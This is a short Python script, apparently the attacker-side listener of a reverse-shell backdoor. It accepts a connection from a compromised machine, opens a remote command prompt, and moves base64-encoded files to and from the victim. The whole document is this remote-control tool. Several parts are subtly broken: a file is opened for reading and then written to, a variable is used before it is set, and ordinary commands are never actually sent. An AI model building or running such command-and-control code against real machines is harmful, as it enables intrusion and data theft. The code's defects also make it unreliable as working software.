import socket
import optparse
import simplejson
import base64


def get_inputs():
    my_parse = optparse.OptionParser()

    my_parse.add_option("-i", "--ip", dest="ip", help="Enter Source Ip")
    my_parse.add_option("-p", "--port", dest="port", help="Port to listen on")

    return my_parse.parse_args()


class MainMate:
    (user_input, arguments) = get_inputs()

    def __init__(self, ip=user_input.ip, port=user_input.port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))

        self.listener.listen(0)  # 0 for no connection limit
        print("Listening..")

        (self.connection, self.ipg) = self.listener.accept()
        print(f"Connected to {self.ipg} on {port} \n\nListening..\n")

    def send_j(self, pack):
        package = simplejson.dumps(pack)
        self.connection.send(package.encode("utf-8"))

    def recv_j(self):
        data = ""
        while True:
            try:
                data += self.connection.recv(2048).decode("utf-8")
                return simplejson.loads(data)
            except ValueError:
                continue

    @staticmethod
    def down_func(file):
        with open(file, "rb") as last:
            return base64.b64encode(last.read())

    @staticmethod
    def saving(file, inc):
        with open(file, "rb") as writing:
            writing.write(base64.b64decode(inc))
            return f"{file} is downloaded"

    def cmd_loop(self):
        while True:
            cmd_inp = input(f"{self.ipg}$ ").split(" ")

            try:
                if cmd_inp[0] == "exit":
                    self.listener.close()
                    break

                elif cmd_inp[0] == "upload":
                    content = self.down_func(cmd_inp[1])
                    cmd_inp.append(str(content))

                    self.send_j(cmd_inp)

                elif cmd_inp[0] == "download" and "Invalid command!" not in cmd_out:
                    cmd_out = self.saving(cmd_inp[1], cmd_out)

                else:
                    cmd_out = self.recv_j()
                    print(cmd_out)

            except Exception:
                cmd_out = "Error!"
            print(cmd_out)

        self.listener.close()


start = MainMate()  # Ip and port are set to CLI-inputs by default
start.cmd_loop()
